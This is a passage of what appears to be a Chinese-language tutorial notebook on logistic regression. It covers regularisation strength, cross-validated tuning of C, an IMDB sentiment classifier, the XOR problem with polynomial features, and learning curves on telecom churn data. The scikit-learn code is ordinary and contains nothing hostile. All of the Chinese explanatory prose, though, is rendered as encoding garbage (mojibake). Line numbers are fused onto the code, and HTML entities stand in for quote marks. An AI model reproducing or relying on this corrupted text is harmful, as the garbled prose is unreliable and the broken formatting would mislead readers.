å€˜è‹¥ç»§ç»­å¢åŠ  ğ¶C åˆ° 10000 ä¼šå¦‚ä½•ï¼Ÿçœ‹ä¸‹é¢ç»“æœï¼Œå¾ˆæ˜æ˜¾æ­£åˆ™åŒ–ä¸å¤Ÿå¼ºå¯¼è‡´äº†è¿‡æ‹Ÿåˆç°è±¡ã€‚ 12345678910111213141516C = 1e4logit = LogisticRegression(C=C, random_state=17)logit.fit(X_poly, y)plot_boundary(logit, X, y, grid_step=.005, poly_featurizer=poly)plt.scatter(X[y == 1, 0], X[y == 1, 1], c=&#x27;blue&#x27;, label=&#x27;Released&#x27;)plt.scatter(X[y == 0, 0], X[y == 0, 1], c=&#x27;orange&#x27;, label=&#x27;Faulty&#x27;)plt.xlabel(&quot;Test 1&quot;)plt.ylabel(&quot;Test 2&quot;)plt.title(&#x27;2 tests of microchips. Logit with C=%s&#x27; % C)plt.legend()print(&quot;Accuracy on training set:&quot;, round(logit.score(X_poly, y), 3)) ä¸ºäº†è®¨è®ºä¸Šè¿°çš„è¿™äº›ç»“æœï¼Œæ”¹å†™ä¸€ä¸‹é€»è¾‘å›å½’çš„ä¼˜åŒ–å‡½æ•°ï¼š J(X,y,w)=L+1Câˆ£âˆ£wâˆ£âˆ£2,J(X,y,w) = \\mathcal{L} + \\frac{1}{C}||w||^2, J(X,y,w)=L+C1â€‹âˆ£âˆ£wâˆ£âˆ£2, å…¶ä¸­ï¼Œ L\\mathcal{L}L æ˜¯å¯¹æ•´ä¸ªæ•°æ®é›†çš„æ€»é€»è¾‘æŸå¤±å‡½æ•° CCC æ˜¯åå‘æ­£åˆ™åŒ–ç³»æ•° æ€»ç»“ï¼š å‚æ•° CCC è¶Šå¤§ï¼Œæ¨¡å‹ä¸­å¯æ¢å¤çš„æ•°æ®ä¹‹é—´çš„å…³ç³»å°±è¶Šå¤æ‚ï¼ˆç›´è§‚åœ°è¯´ï¼ŒCCC å¯¹åº”æ¨¡å‹çš„ã€Œå¤æ‚åº¦ã€ï¼šæ¨¡å‹èƒ½åŠ›ï¼‰ã€‚ å¦‚æœæ­£åˆ™åŒ–è¿‡å¼ºï¼Œå³ CCC å€¼å¾ˆå°ï¼Œæœ€å°åŒ–é€»è¾‘æŸå¤±å‡½æ•°é—®é¢˜çš„è§£ï¼ˆæƒé‡ï¼‰å¯èƒ½è¿‡å°æˆ–ä¸ºé›¶ã€‚è¿™æ ·çš„æ¨¡å‹å¯¹è¯¯å·®çš„ã€Œæƒ©ç½šã€ä¹Ÿä¸å¤Ÿï¼ˆå³åœ¨ä¸Šé¢çš„å‡½æ•° J(X,y,w)J(X,y,w)J(X,y,w) ä¸­ï¼Œæƒé‡çš„å¹³æ–¹å’Œè¿‡é«˜ï¼Œå¯¼è‡´è¯¯å·® LLL è¾ƒå¤§ï¼‰ã€‚åœ¨è¿™ä¸€æƒ…å½¢ä¸‹ï¼Œæ¨¡å‹å°†ä¼šæ¬ æ‹Ÿåˆã€‚ å¦‚æœæ­£åˆ™åŒ–è¿‡å¼±ï¼Œå³ CCC å€¼å¾ˆå¤§ï¼Œæœ€å°åŒ–é€»è¾‘æŸå¤±å‡½æ•°é—®é¢˜çš„è§£å¯èƒ½æƒé‡è¿‡å¤§ã€‚åœ¨è¿™ä¸€æƒ…å½¢ä¸‹ï¼Œ LLL å¯¹å‡½æ•° J(X,y,w)J(X,y,w)J(X,y,w) è´¡çŒ®è¾ƒå¤§ï¼Œå¯¼è‡´è¿‡æ‹Ÿåˆã€‚ CCC æ˜¯ä¸€ä¸ªè¶…å‚æ•°ï¼Œé€»è¾‘å›å½’ä¸ä¼šè‡ªåŠ¨å­¦ä¹ è°ƒæ•´ CCC çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡äº¤å‰éªŒè¯æ¥äººå·¥é€‰æ‹©è¾ƒå¥½çš„ CCC å€¼ã€‚ æ­£åˆ™åŒ–å‚æ•°çš„è°ƒæ•´ å¯¹ä¸Šè¿°ä¾‹å­ä¸­æ­£åˆ™åŒ–å‚æ•° CCC è¿›è¡Œè°ƒå‚ã€‚ä½¿ç”¨ LogisticRegressionCV() æ–¹æ³•è¿›è¡Œç½‘æ ¼æœç´¢å‚æ•°åå†äº¤å‰éªŒè¯ï¼ŒLogisticRegressionCV() æ˜¯ä¸“é—¨ä¸ºé€»è¾‘å›å½’è®¾è®¡çš„ã€‚å¦‚æœæƒ³å¯¹å…¶ä»–æ¨¡å‹è¿›è¡ŒåŒæ ·çš„æ“ä½œï¼Œå¯ä»¥ä½¿ç”¨ GridSearchCV() æˆ– RandomizedSearchCV() ç­‰è¶…å‚æ•°ä¼˜åŒ–ç®—æ³•ã€‚ 1234567891011# è¯¥å•å…ƒæ ¼æ‰§è¡Œæ—¶é—´è¾ƒé•¿ï¼Œè¯·è€å¿ƒç­‰å¾…skf = StratifiedKFold(n_splits=5, shuffle=True, random_state=17)# ä¸‹æ–¹ç»“å°¾çš„åˆ‡ç‰‡ä¸ºäº†åœ¨çº¿ä¸Šç¯å¢ƒæœç´¢æ›´å¿«ï¼Œçº¿ä¸‹ç»ƒä¹ æ—¶å¯ä»¥åˆ é™¤c_values = np.logspace(-2, 3, 500)[50:450:50]logit_searcher = LogisticRegressionCV( Cs=c_values, cv=skf, verbose=1, n_jobs=-1)logit_searcher.fit(X_poly, y)logit_searcher.C_ æŸ¥çœ‹è¶…å‚æ•° CCC æ˜¯å¦‚ä½•å½±å“æ¨¡å‹çš„è´¨é‡çš„ã€‚ 1234plt.plot(c_values, np.mean(logit_searcher.scores_[1], axis=0))plt.xlabel(&#x27;C&#x27;)plt.ylabel(&#x27;Mean CV-accuracy&#x27;) æœ€åï¼Œé€‰æ‹© CCC å€¼ã€Œæœ€ä½³ã€çš„åŒºåŸŸï¼Œå³åœ¨ Mean CV-accuracy å€¼è¾¾åˆ°è¾ƒå¤§å€¼çš„å‰æä¸‹é€‰æ‹©è¾ƒå°çš„ CCCã€‚ä¸Šå›¾ç”±äº CCC è¿‡å¤§ï¼Œæ— æ³•è¾¨è®¤å…·ä½“å“ªä¸ªè¾ƒå°çš„ CCC è¾¾åˆ°äº†è¾ƒå¥½çš„ Mean CV-accuracy å€¼ï¼Œå¯ä»¥ä»…ç”»å‡º CCC ä¸º 0 åˆ° 10 æ—¶çš„éªŒè¯æ›²çº¿ã€‚ 12345plt.plot(c_values, np.mean(logit_searcher.scores_[1], axis=0))plt.xlabel(&#x27;C&#x27;)plt.ylabel(&#x27;Mean CV-accuracy&#x27;)plt.xlim((0, 10)) ä¸Šå›¾å¯è§ï¼ŒC=2C=2C=2 æ—¶å°±è¾¾åˆ°äº†è¾ƒå¥½çš„ Mean CV-accuracy å€¼ã€‚ é€»è¾‘å›å½’çš„ä¼˜ç¼ºç‚¹ é€šè¿‡åˆ†æ IMDB å½±è¯„çš„äºŒå…ƒåˆ†ç±»é—®é¢˜å’Œ XOR é—®é¢˜æ¥ç®€è¦è¯´æ˜é€»è¾‘å›å½’çš„ä¼˜ç¼ºç‚¹ã€‚ åˆ†æ IMDB äºŒå…ƒåˆ†ç±»é—®é¢˜ IMDB æ•°æ®é›†ä¸­çš„è®­ç»ƒé›†åŒ…å«æ ‡è®°å¥½çš„å½±è¯„ï¼Œå…¶ä¸­æœ‰ 12500 æ¡å¥½è¯„ï¼Œ12500 æ¡å·®è¯„ã€‚ä½¿ç”¨è¯è¢‹æ¨¡å‹æ„å»ºè¾“å…¥çŸ©é˜µ ğ‘‹X ï¼Œè¯­æ–™åº“åŒ…å«æ‰€æœ‰ç”¨æˆ·å½±è¯„ï¼Œå½±è¯„çš„ç‰¹å¾å°†ç”±æ•´ä¸ªè¯­æ–™åº“ä¸­æ¯ä¸ªè¯çš„å‡ºç°æƒ…å†µæ¥è¡¨ç¤ºã€‚ä¸‹å›¾å±•ç¤ºäº†è¿™ä¸€æ€è·¯ï¼š 12345678import osimport numpy as npimport matplotlib.pyplot as pltimport numpy as npfrom sklearn.datasets import load_filesfrom sklearn.feature_extraction.text import CountVectorizerfrom sklearn.linear_model import LogisticRegression è½½å…¥ IMDB æ•°æ®é›†ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬ä»è“æ¡¥äº‘è¯¾æœåŠ¡å™¨ä¸Šä¸‹è½½å¹¶è§£å‹æ•°æ®ã€‚ 1234567891011# æ–‡ä»¶è¾ƒå¤šï¼Œè¯·è€å¿ƒç­‰å¾…è§£å‹å®Œæˆ!wget -nc &quot;https://labfile.oss.aliyuncs.com/courses/1283/aclImdb_v1.tar.gz&quot;!tar -zxvf &quot;aclImdb_v1.tar.gz&quot;PATH_TO_IMDB = &quot;aclImdb/&quot;reviews_train = load_files(os.path.join(PATH_TO_IMDB, &quot;train&quot;), categories=[&#x27;pos&#x27;, &#x27;neg&#x27;])text_train, y_train = reviews_train.data, reviews_train.targetreviews_test = load_files(os.path.join(PATH_TO_IMDB, &quot;test&quot;), categories=[&#x27;pos&#x27;, &#x27;neg&#x27;])text_test, y_test = reviews_test.data, reviews_test.target çœ‹çœ‹è®­ç»ƒé›†å’Œæµ‹è¯•é›†ä¸­å„æœ‰å¤šå°‘æ¡æ•°æ®ã€‚ 12345print(&quot;Number of documents in training data: %d&quot; % len(text_train))print(np.bincount(y_train))print(&quot;Number of documents in test data: %d&quot; % len(text_test))print(np.bincount(y_test)) ä¸‹é¢æ˜¯è¯¥æ•°æ®é›†ä¸­çš„ä¸€äº›å½±è¯„ã€‚ 1text_train[1] æŸ¥çœ‹ä¸€ä¸‹ä¸Šé¢è¿™æ¡å½±è¯„æ˜¯å·®è¯„è¿˜æ˜¯å¥½è¯„ã€‚ 12y_train[1] y_train=0 è¡¨ç¤ºå½±è¯„æ˜¯å·®è¯„ï¼Œy_train=1 è¡¨ç¤ºå½±è¯„æ˜¯å¥½è¯„ï¼Œä¸Šé¢è¿™æ¡å½±ç‰‡æ˜¯å·®è¯„ã€‚ å•è¯çš„ç®€å•è®¡æ•° é¦–å…ˆï¼Œä½¿ç”¨ CountVectorizer() åˆ›å»ºåŒ…å«æ‰€æœ‰å•è¯çš„å­—å…¸ã€‚ 1234cv = CountVectorizer()cv.fit(text_train)len(cv.vocabulary_) æŸ¥çœ‹åˆ›å»ºåçš„ã€Œå•è¯ã€æ ·æœ¬ï¼Œå‘ç° IMDB æ•°æ®é›†å·²ç»è‡ªåŠ¨è¿›è¡Œäº†æ–‡æœ¬å¤„ç†ï¼ˆè‡ªåŠ¨åŒ–æ–‡æœ¬å¤„ç†ä¸åœ¨æœ¬å®éªŒè®¨è®ºèŒƒå›´ï¼Œå¦‚æœæ„Ÿå…´è¶£å¯ä»¥è‡ªè¡Œæœç´¢ï¼‰ã€‚ 12print(cv.get_feature_names()[:50])print(cv.get_feature_names()[50000:50050]) æ¥ç€ï¼Œä½¿ç”¨å•è¯çš„ç´¢å¼•ç¼–ç è®­ç»ƒé›†çš„å¥å­ï¼Œç”¨ç¨€ç–çŸ©é˜µä¿å­˜ã€‚ 12X_train = cv.transform(text_train)X_train è®©æˆ‘ä»¬çœ‹çœ‹ä¸Šè¿°è½¬æ¢è¿‡ç¨‹æ˜¯å¦‚ä½•è¿›è¡Œçš„ï¼Œé¦–å…ˆæŸ¥çœ‹éœ€è¦è½¬æ¢çš„è®­ç»ƒé›†å¥å­ã€‚ 1text_train[19726] ç„¶åå°†æ¯ä¸ªå•è¯è½¬æ¢æˆå¯¹åº”çš„å•è¯ç´¢å¼•ã€‚ 123X_train[19726].nonzero()[1]X_train[19726].nonzero() æ¥ä¸‹æ¥ï¼Œå¯¹æµ‹è¯•é›†åº”ç”¨åŒæ ·çš„æ“ä½œã€‚ 1X_test = cv.transform(text_test) ä¹‹åå°±å¯ä»¥ä½¿ç”¨é€»è¾‘å›å½’æ¥è®­ç»ƒæ¨¡å‹ã€‚ 12logit = LogisticRegression(solver=&#x27;lbfgs&#x27;, n_jobs=-1, random_state=7)logit.fit(X_train, y_train) è®­ç»ƒå®Œæˆåï¼ŒæŸ¥çœ‹è®­ç»ƒé›†å’Œæµ‹è¯•é›†ä¸Šçš„å‡†ç¡®ç‡ï¼ˆAccuracyï¼‰ã€‚ 1round(logit.score(X_train, y_train), 3), round(logit.score(X_test, y_test), 3), å¯è§†åŒ–æ¨¡å‹çš„ç³»æ•°ã€‚ 12345678910111213141516171819202122232425def visualize_coefficients(classifier, feature_names, n_top_features=25): # get coefficients with large absolute values coef = classifier.coef_.ravel() positive_coefficients = np.argsort(coef)[-n_top_features:] negative_coefficients = np.argsort(coef)[:n_top_features] interesting_coefficients = np.hstack( [negative_coefficients, positive_coefficients]) # plot them plt.figure(figsize=(15, 5)) colors = [&quot;red&quot; if c &lt; 0 else &quot;blue&quot; for c in coef[interesting_coefficients]] plt.bar(np.arange(2 * n_top_features), coef[interesting_coefficients], color=colors) feature_names = np.array(feature_names) plt.xticks(np.arange(1, 1 + 2 * n_top_features), feature_names[interesting_coefficients], rotation=60, ha=&quot;right&quot;)def plot_grid_scores(grid, param_name): plt.plot(grid.param_grid[param_name], grid.cv_results_[&#x27;mean_train_score&#x27;], color=&#x27;green&#x27;, label=&#x27;train&#x27;) plt.plot(grid.param_grid[param_name], grid.cv_results_[&#x27;mean_test_score&#x27;], color=&#x27;red&#x27;, label=&#x27;test&#x27;) plt.legend()visualize_coefficients(logit, cv.get_feature_names()) å¯¹é€»è¾‘å›å½’çš„æ­£åˆ™åŒ–ç³»æ•°è¿›è¡Œè°ƒå‚ã€‚make_pipeline() ç¡®ä¿çš„åºåˆ—é¡ºåºï¼Œåœ¨è®­ç»ƒæ•°æ®ä¸Šåº”ç”¨ CountVectorizer() æ–¹æ³•ï¼Œç„¶åè®­ç»ƒé€»è¾‘å›å½’æ¨¡å‹ã€‚ 1234567891011121314151617181920from sklearn.pipeline import make_pipeline# è¯¥å•å…ƒæ ¼æ‰§è¡Œæ—¶é—´è¾ƒé•¿ï¼Œè¯·è€å¿ƒç­‰å¾…text_pipe_logit = make_pipeline(CountVectorizer(), LogisticRegression(solver=&#x27;lbfgs&#x27;, n_jobs=1, random_state=7))text_pipe_logit.fit(text_train, y_train)print(text_pipe_logit.score(text_test, y_test))from sklearn.model_selection import GridSearchCV# è¯¥å•å…ƒæ ¼æ‰§è¡Œæ—¶é—´è¾ƒé•¿ï¼Œè¯·è€å¿ƒç­‰å¾…param_grid_logit = &#123;&#x27;logisticregression__C&#x27;: np.logspace(-5, 0, 6)[4:5]&#125;grid_logit = GridSearchCV(text_pipe_logit, param_grid_logit, return_train_score=True, cv=3, n_jobs=-1)grid_logit.fit(text_train, y_train) æŸ¥çœ‹ä¸€ä¸‹æœ€ä½³ CCCï¼Œä»¥åŠç›¸åº”çš„äº¤å‰éªŒè¯è¯„åˆ†ã€‚ 1234grid_logit.best_params_, grid_logit.best_score_plot_grid_scores(grid_logit, &#x27;logisticregression__C&#x27;) è°ƒä¼˜åçš„é€»è¾‘å›å½’æ¨¡å‹åœ¨éªŒè¯é›†ä¸Šçš„å‡†ç¡®ç‡ã€‚ 12grid_logit.score(text_test, y_test) ç°åœ¨æ¢ä¸€ç§æ–¹æ³•ï¼Œä½¿ç”¨éšæœºæ£®æ—æ¥åˆ†ç±»ã€‚ 123456789from sklearn.ensemble import RandomForestClassifierforest = RandomForestClassifier(n_estimators=200, n_jobs=-1, random_state=17)forest.fit(X_train, y_train)round(forest.score(X_test, y_test), 3) ä¸Šè¿°ç»“æœå¯è§ï¼Œç›¸è¾ƒäºéšæœºæ£®æ—ï¼Œé€»è¾‘å›å½’åœ¨ IMDB æ•°æ®é›†ä¸Šè¡¨ç°æ›´ä¼˜ã€‚ XOR é—®é¢˜ çº¿æ€§åˆ†ç±»å®šä¹‰çš„æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„åˆ†ç•Œå¹³é¢ï¼šä¸€ä¸ªè¶…å¹³é¢ï¼Œè¿™å¯¼è‡´çº¿æ€§æ¨¡å‹åœ¨ XOR é—®é¢˜ä¸Šè¡¨ç°ä¸ä½³ã€‚XOR å³å¼‚æˆ–ï¼Œå…¶çœŸå€¼è¡¨å¦‚ä¸‹ï¼š XOR æ˜¯ä¸€ä¸ªç®€å•çš„äºŒå…ƒåˆ†ç±»é—®é¢˜ï¼Œå…¶ä¸­ä¸¤ä¸ªåˆ†ç±»å‘ˆå¯¹è§’äº¤å‰åˆ†å¸ƒã€‚ä¸‹é¢åˆ›å»ºæ•°æ®é›†ã€‚ 123456rng = np.random.RandomState(0)X = rng.randn(200, 2)y = np.logical_xor(X[:, 0] &gt; 0, X[:, 1] &gt; 0)plt.scatter(X[:, 0], X[:, 1], s=30, c=y, cmap=plt.cm.Paired) æ˜¾ç„¶ï¼Œæ— æ³•åˆ’å‡ºä¸€æ¡ç›´çº¿æ— è¯¯å·®åœ°å°†ä¸¤ä¸ªåˆ†ç±»åˆ†å¼€ã€‚å› æ­¤ï¼Œé€»è¾‘å›å½’åœ¨è¿™ä¸€ä»»åŠ¡ä¸Šçš„è¡¨ç°å¾ˆå·®ã€‚ 123456789101112131415161718192021222324def plot_boundary(clf, X, y, plot_title): xx, yy = np.meshgrid(np.linspace(-3, 3, 50), np.linspace(-3, 3, 50)) clf.fit(X, y) # plot the decision function for each datapoint on the grid Z = clf.predict_proba(np.vstack((xx.ravel(), yy.ravel())).T)[:, 1] Z = Z.reshape(xx.shape) image = plt.imshow(Z, interpolation=&#x27;nearest&#x27;, extent=(xx.min(), xx.max(), yy.min(), yy.max()), aspect=&#x27;auto&#x27;, origin=&#x27;lower&#x27;, cmap=plt.cm.PuOr_r) contours = plt.contour(xx, yy, Z, levels=[0], linewidths=2, linetypes=&#x27;--&#x27;) plt.scatter(X[:, 0], X[:, 1], s=30, c=y, cmap=plt.cm.Paired) plt.xticks(()) plt.yticks(()) plt.xlabel(r&#x27;$x_1$&#x27;) plt.ylabel(r&#x27;$x_2$&#x27;) plt.axis([-3, 3, -3, 3]) plt.colorbar(image) plt.title(plot_title, fontsize=12)plot_boundary(LogisticRegression(solver=&#x27;lbfgs&#x27;), X, y, &quot;Logistic Regression, XOR problem&quot;) ç„¶è€Œï¼Œå¦‚æœå°†è¾“å…¥å˜ä¸ºå¤šé¡¹å¼ç‰¹å¾ï¼ˆè¿™é‡Œ ğ‘‘d = 2ï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸€ä»»åŠ¡å°±å¯ä»¥å¾—åˆ°è¾ƒå¥½çš„è§£å†³ã€‚ 12345678from sklearn.preprocessing import PolynomialFeaturesfrom sklearn.pipeline import Pipelinelogit_pipe = Pipeline([(&#x27;poly&#x27;, PolynomialFeatures(degree=2)), (&#x27;logit&#x27;, LogisticRegression(solver=&#x27;lbfgs&#x27;))])plot_boundary(logit_pipe, X, y, &quot;Logistic Regression + quadratic features. XOR problem&quot;) é€šè¿‡å°†å¤šé¡¹å¼ç‰¹å¾ä½œä¸ºè¾“å…¥ï¼Œé€»è¾‘å›å½’åœ¨ 6 ç»´ç‰¹å¾ç©ºé—´ï¼ˆ1ï¼Œğ‘¥1ï¼Œğ‘¥2ï¼Œğ‘¥12ï¼Œğ‘¥1ğ‘¥2ï¼Œğ‘¥221ï¼Œx1ï¼Œx2ï¼Œx12ï¼Œx1x2ï¼Œx22ï¼‰ä¸­ç”Ÿæˆäº†ä¸€ä¸ªè¶…å¹³é¢ã€‚å½“è¿™ä¸ªè¶…å¹³é¢æŠ•å½±åˆ°åŸç‰¹å¾ç©ºé—´ï¼ˆğ‘¥1,ğ‘¥2x1,x2ï¼‰æ—¶ï¼Œåˆ†ç•Œæ˜¯éçº¿æ€§çš„ã€‚ åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¤šé¡¹å¼ç‰¹å¾ç¡®å®æœ‰ç”¨ï¼Œä¸è¿‡æ˜¾å¼çš„åˆ›å»ºå®ƒä»¬ä¼šå¤§å¤§æå‡è®¡ç®—å¤æ‚åº¦ã€‚ä½¿ç”¨æ ¸ï¼ˆkernelï¼‰å‡½æ•°çš„ SVM æ–¹æ³•ç›¸è¾ƒé€»è¾‘å›å½’è¦å¿«å¾ˆå¤šï¼Œåœ¨ SVM ä¸­ï¼Œåªè®¡ç®—é«˜ç»´ç©ºé—´ä¸­ç›®æ ‡ä¹‹é—´çš„è·ç¦»ï¼ˆç”±æ ¸å‡½æ•°å®šä¹‰ï¼‰ï¼Œè€Œä¸ç”¨ç”Ÿæˆå¤§é‡ç‰¹å¾ç»„åˆã€‚ éªŒè¯å’Œå­¦ä¹ æ›²çº¿ 12345678import numpy as npimport pandas as pdfrom sklearn.preprocessing import PolynomialFeaturesfrom sklearn.pipeline import Pipelinefrom sklearn.preprocessing import StandardScalerfrom sklearn.linear_model import LogisticRegression, LogisticRegressionCV, SGDClassifierfrom sklearn.model_selection import validation_curve, learning_curvefrom matplotlib import pyplot as plt ä¸Šæ–‡å¯¹æ¨¡å‹éªŒè¯ã€äº¤å‰éªŒè¯ã€æ­£åˆ™åŒ–åšäº†ç®€å•ä»‹ç»ï¼Œç°åœ¨è€ƒè™‘ä¸€ä¸ªæ›´å¤§çš„é—®é¢˜ï¼šå¦‚æœæ¨¡å‹çš„è´¨é‡ä¸ä½³ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿé’ˆå¯¹è¿™ä¸ªé—®é¢˜ï¼Œæœ‰å¾ˆå¤šçŒœæƒ³ï¼š åº”è¯¥è®©æ¨¡å‹æ›´å¤æ‚è¿˜æ˜¯æ›´ç®€å•ï¼Ÿ åº”è¯¥åŠ å…¥æ›´å¤šç‰¹å¾å—ï¼Ÿ æ˜¯å¦åªæ˜¯éœ€è¦æ›´å¤šæ•°æ®ç”¨äºè®­ç»ƒï¼Ÿ è¿™äº›çŒœæƒ³çš„ç­”æ¡ˆå¹¶ä¸æ˜æ˜¾ï¼Œæ¯”å¦‚æœ‰æ—¶å€™ä¸€ä¸ªæ›´å¤æ‚çš„æ¨¡å‹ä¼šå¯¼è‡´è¡¨ç°é€€åŒ–ï¼Œæœ‰æ—¶å€™å¢åŠ æ–°çš„ç‰¹å¾å¸¦æ¥çš„å˜åŒ–å¹¶ä¸ç›´è§‚ã€‚äº‹å®ä¸Šï¼Œåšå‡ºæ­£ç¡®å†³å®šï¼Œé€‰æ‹©æ­£ç¡®æ–¹æ³•ï¼Œä»è€Œæ”¹è¿›æ¨¡å‹çš„èƒ½åŠ›æ˜¯è¡¡é‡ä¸€ä¸ªäººå¯¹æœºå™¨å­¦ä¹ çŸ¥è¯†æŒæ¡ç¨‹åº¦çš„é‡è¦æŒ‡æ ‡ã€‚ è®©æˆ‘ä»¬å›å¤´çœ‹çœ‹ç”µä¿¡è¿è¥å•†çš„å®¢æˆ·ç¦»ç½‘æ•°æ®é›†ã€‚ 123456789data = pd.read_csv( &#x27;https://labfile.oss.aliyuncs.com/courses/1283/telecom_churn.csv&#x27;).drop(&#x27;State&#x27;, axis=1)data[&#x27;International plan&#x27;] = data[&#x27;International plan&#x27;].map( &#123;&#x27;Yes&#x27;: 1, &#x27;No&#x27;: 0&#125;)data[&#x27;Voice mail plan&#x27;] = data[&#x27;Voice mail plan&#x27;].map(&#123;&#x27;Yes&#x27;: 1, &#x27;No&#x27;: 0&#125;)y = data[&#x27;Churn&#x27;].astype(&#x27;int&#x27;).valuesX = data.drop(&#x27;Churn&#x27;, axis=1).values ä½¿ç”¨éšæœºæ¢¯åº¦ä¸‹é™è®­ç»ƒé€»è¾‘å›å½’ï¼ˆåœ¨ä¹‹åçš„å®éªŒä¸­å°†ä¼šä¸“é—¨è®¨è®ºæ¢¯åº¦ä¸‹é™ï¼‰ã€‚ 12345678alphas = np.logspace(-2, 0, 20)sgd_logit = SGDClassifier(loss=&#x27;log&#x27;, n_jobs=-1, random_state=17, max_iter=5)logit_pipe = Pipeline([(&#x27;scaler&#x27;, StandardScaler()), (&#x27;poly&#x27;, PolynomialFeatures(degree=2)), (&#x27;sgd_logit&#x27;, sgd_logit)])val_train, val_test = validation_curve(logit_pipe, X, y, &#x27;sgd_logit__alpha&#x27;, alphas, cv=5, scoring=&#x27;roc_auc&#x27;) ç»˜åˆ¶ ROC-AUC æ›²çº¿ï¼ŒæŸ¥çœ‹ä¸åŒæ­£åˆ™åŒ–å‚æ•°ä¸‹æ¨¡å‹åœ¨è®­ç»ƒé›†å’Œæµ‹è¯•é›†ä¸Šçš„è¡¨ç°æœ‰ä½•ä¸åŒã€‚ 1234567891011121314def plot_with_err(x, data, **kwargs): mu, std = data.mean(1), data.std(1) lines = plt.plot(x, mu, &#x27;-&#x27;, **kwargs) plt.fill_between(x, mu - std, mu + std, edgecolor=&#x27;none&#x27;, facecolor=lines[0].get_color(), alpha=0.2)plot_with_err(alphas, val_train, label=&#x27;training scores&#x27;)plot_with_err(alphas, val_test, label=&#x27;validation scores&#x27;)plt.xlabel(r&#x27;$\\alpha$&#x27;)plt.ylabel(&#x27;ROC AUC&#x27;)plt.legend()plt.grid(True) ä¸Šå›¾çš„è¶‹åŠ¿è¡¨æ˜ï¼š ç®€å•æ¨¡å‹çš„è®­ç»ƒè¯¯å·®å’ŒéªŒè¯è¯¯å·®å¾ˆæ¥è¿‘ï¼Œä¸”éƒ½æ¯”è¾ƒå¤§ã€‚è¿™æš—ç¤ºæ¨¡å‹æ¬ æ‹Ÿåˆï¼Œå‚æ•°æ•°é‡ä¸å¤Ÿå¤šã€‚ é«˜åº¦å¤æ‚æ¨¡å‹çš„è®­ç»ƒè¯¯å·®å’ŒéªŒè¯è¯¯å·®ç›¸å·®å¾ˆå¤§ï¼Œè¿™æš—ç¤ºæ¨¡å‹è¿‡æ‹Ÿåˆã€‚å½“å‚æ•°æ•°é‡è¿‡å¤šæˆ–è€…æ­£åˆ™åŒ–ä¸å¤Ÿä¸¥æ ¼æ—¶ï¼Œç®—æ³•å¯èƒ½è¢«æ•°æ®ä¸­çš„å™ªå£°ã€Œè½¬ç§»æ³¨æ„åŠ›ã€ï¼Œæ²¡èƒ½æŠŠæ¡æ•°æ®çš„æ•´ä½“è¶‹åŠ¿ã€‚ ä¸Šè¿°ç»“è®ºå¯ä»¥æ¨å¹¿åˆ°å…¶ä»–é—®é¢˜ä¸­ã€‚ æ•°æ®å¯¹äºæ¨¡å‹çš„å½±å“ ä¸€èˆ¬è€Œè¨€ï¼Œæ¨¡å‹æ‰€ç”¨çš„æ•°æ®è¶Šå¤šè¶Šå¥½ã€‚ä½†æ–°æ•°æ®æ˜¯å¦åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½æœ‰å¸®åŠ©å‘¢ï¼Ÿä¾‹å¦‚ï¼Œä¸ºäº†è¯„ä¼°ç‰¹å¾ N ï¼Œè€Œå¯¹æ•°æ®é›†çš„æ•°æ®è¿›è¡ŒåŠ å€ï¼Œè¿™æ ·åšæ˜¯å¦åˆç†ï¼Ÿ ç”±äºæ–°æ•°æ®å¯èƒ½éš¾ä»¥å–å¾—ï¼Œåˆç†çš„åšæ³•æ˜¯æ”¹å˜è®­ç»ƒé›†çš„å¤§å°ï¼Œç„¶åçœ‹æ¨¡å‹çš„è´¨é‡ä¸è®­ç»ƒæ•°æ®çš„æ•°é‡ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œè¿™å°±æ˜¯ã€Œå­¦ä¹ æ›²çº¿ã€çš„æ¦‚å¿µã€‚ è¿™ä¸ªæƒ³æ³•å¾ˆç®€å•ï¼šå°†è¯¯å·®çœ‹ä½œè®­ç»ƒä¸­æ‰€ä½¿ç”¨çš„æ ·æœ¬æ•°é‡çš„å‡½æ•°ã€‚æ¨¡å‹çš„å‚æ•°äº‹å…ˆå›ºå®šã€‚ 12345678910111213def plot_learning_curve(degree=2, alpha=0.01): train_sizes = np.linspace(0.05, 1, 20) logit_pipe = Pipeline([(&#x27;scaler&#x27;, StandardScaler()), (&#x27;poly&#x27;, PolynomialFeatures(degree=degree)), (&#x27;sgd_logit&#x27;, SGDClassifier(n_jobs=-1, random_state=17, alpha=alpha, max_iter=5))]) N_train, val_train, val_test = learning_curve(logit_pipe, X, y, train_sizes=train_sizes, cv=5, scoring=&#x27;roc_auc&#x27;) plot_with_err(N_train, val_train, label=&#x27;training scores&#x27;) plot_with_err(N_train, val_test, label=&#x27;validation scores&#x27;) plt.xlabel(&#x27;Training Set Size&#x27;) plt.ylabel(&#x27;AUC&#x27;) plt.legend() plt.grid(True) æŠŠæ­£åˆ™åŒ–ç³»æ•°è®¾å®šä¸ºè¾ƒå¤§çš„æ•°ï¼ˆalpha=10ï¼‰ï¼ŒæŸ¥çœ‹çº¿æ€§æ¨¡å‹çš„è¡¨ç°æƒ…å†µã€‚ 1plot_learning_curve(degree=2, alpha=10) ä¸Šå›¾è¡¨æ˜ï¼šå¯¹äºå°‘é‡æ•°æ®è€Œè¨€ï¼Œè®­ç»ƒé›†å’Œäº¤å‰éªŒè¯é›†ä¹‹é—´çš„è¯¯å·®å·®åˆ«ï¼ˆæ–¹å·®ï¼‰ç›¸å½“å¤§ï¼Œè¿™æš—ç¤ºäº†è¿‡æ‹Ÿåˆã€‚åŒæ ·çš„æ¨¡å‹ï¼Œä½¿ç”¨å¤§é‡æ•°æ®ï¼Œè¯¯å·®ã€Œæ”¶æ•›ã€ï¼Œæš—ç¤ºäº†æ¬ æ‹Ÿåˆã€‚åŠ å…¥æ›´å¤šæ•°æ®ï¼Œè¯¥è®­ç»ƒé›†çš„è¯¯å·®ä¸ä¼šå¢åŠ 